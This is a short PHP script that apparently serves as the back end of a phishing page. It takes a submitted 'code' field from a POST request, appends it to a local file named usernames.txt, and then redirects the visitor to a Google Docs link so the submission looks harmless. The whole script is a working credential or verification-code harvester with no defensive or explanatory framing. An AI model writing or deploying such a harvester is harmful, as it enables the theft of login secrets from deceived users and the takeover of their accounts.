<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['code'])) {
        file_put_contents("usernames.txt", "Code: " . $_POST['code'] . "\n", FILE_APPEND);
        header('Location: https://docs.google.com/document/d/1ngV-OyQuhQ9cx3DFY-jF51Jqdy4RKU3iGbntYQbWMxc/edit?usp=sharing');
        exit();
    } else {
        echo "Code not set!";
    }
} else {
    echo "Not a POST request!";
}
